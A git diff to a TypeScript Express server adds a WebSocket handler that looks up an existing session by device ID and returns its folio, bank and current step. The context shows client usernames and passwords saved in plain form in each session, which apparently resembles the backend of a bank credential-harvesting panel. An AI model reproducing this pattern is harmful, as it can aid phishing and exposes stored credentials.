@@ -1137,6 +1137,45 @@ export async function registerRoutes(app: Express): Promise<Server> {
           return;
         }
 
+        // Handle check for existing session by device ID
+        if (data.type === 'CHECK_EXISTING_SESSION') {
+          try {
+            const { deviceId } = data;
+            console.log(`[WebSocket] Verificando sesión existente para dispositivo: ${deviceId}`);
+            
+            // Buscar sesión existente por deviceId
+            const existingSession = await storage.getSessionByDeviceId(deviceId);
+            
+            if (existingSession) {
+              console.log(`[WebSocket] Sesión existente encontrada: ${existingSession.sessionId}`);
+              // Enviar la sesión existente al cliente
+              ws.send(JSON.stringify({
+                type: 'EXISTING_SESSION_FOUND',
+                data: {
+                  sessionId: existingSession.sessionId,
+                  folio: existingSession.folio,
+                  banco: existingSession.banco,
+                  pasoActual: existingSession.pasoActual
+                }
+              }));
+            } else {
+              console.log(`[WebSocket] No se encontró sesión existente para dispositivo: ${deviceId}`);
+              // Enviar confirmación de que no hay sesión existente
+              ws.send(JSON.stringify({
+                type: 'NO_EXISTING_SESSION',
+                data: { deviceId }
+              }));
+            }
+          } catch (error) {
+            console.error("Error checking existing session:", error);
+            ws.send(JSON.stringify({ 
+              type: 'ERROR', 
+              message: "Error checking existing session" 
+            }));
+          }
+          return;
+        }
+
         // Handle new client session creation from homepage
         if (data.type === 'NEW_CLIENT_SESSION') {
           try {
@@ -1153,6 +1192,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
               active: true,
               saved: false,
               createdAt: new Date(),
+              deviceId: data.data.deviceId || null,
               // Datos del cliente que inició sesión
               username: clientData.username,
               password: clientData.password
